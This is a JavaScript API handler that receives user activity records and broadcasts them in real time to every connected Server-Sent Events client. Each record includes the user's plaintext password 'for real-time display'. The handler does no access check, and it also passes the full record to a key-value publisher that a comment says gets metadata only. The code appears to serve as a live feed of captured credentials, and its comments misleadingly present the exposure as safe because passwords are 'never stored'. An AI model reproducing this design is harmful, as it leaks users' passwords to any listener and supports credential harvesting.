// Activity broadcast endpoint
// Accepts activity data and broadcasts to all connected SSE clients
// Credentials exist only in memory during broadcast - never stored

import { publishActivity } from './kv-client';

// In-memory store for active SSE connections
const sseConnections = new Set();

export function addSSEConnection(res) {
  sseConnections.add(res);
  
  // Remove connection when client disconnects
  res.on('close', () => {
    sseConnections.delete(res);
  });
}

export function broadcastToSSE(data) {
  const message = `data: ${JSON.stringify(data)}\n\n`;
  
  sseConnections.forEach(res => {
    try {
      res.write(message);
    } catch (error) {
      // Connection closed, remove it
      sseConnections.delete(res);
    }
  });
}

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { type, userId, additionalData } = req.body;
    
    // Create activity object
    const activity = {
      id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
      type,
      userId,
      timestamp: new Date().toISOString(),
      hasPassword: additionalData?.hasPassword || false,
      // Include password in activity for real-time display (exists only in memory)
      password: additionalData?.password || null
    };
    
    // Publish to KV (metadata only) and broadcast via SSE
    await publishActivity(activity);
    
    // Also broadcast directly to connected SSE clients (for immediate delivery)
    broadcastToSSE({
      type: 'activity',
      data: activity
    });
    
    res.status(200).json({ success: true, activity: { id: activity.id, type: activity.type } });
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}

